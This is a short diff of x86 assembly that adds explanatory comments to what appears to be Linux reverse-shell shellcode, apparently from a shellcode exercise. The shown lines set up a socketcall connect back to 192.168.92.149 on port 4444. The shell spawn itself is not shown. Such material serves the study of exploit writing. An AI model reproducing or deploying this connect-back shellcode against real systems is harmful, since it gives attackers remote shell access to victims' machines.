@@ -36,9 +36,9 @@ _start:
 	; (AF_INET=2, sin_port=4444, INADDR_ANY=192.168.92.149) -> ecx pints to args 
 
 	xor eax, eax
-	mov al, 102
+	mov al, 102 ; __NR_socketcall 102
 	inc ebx
-	inc ebx
+	inc ebx ; SYS_CONNECT (3)
 	push dword 0x955ca8c0 ; IP: 192.168.92.149
 	push word 0x5c11 ; PORT: 4444
 	push word 2 ; AF_INET 2
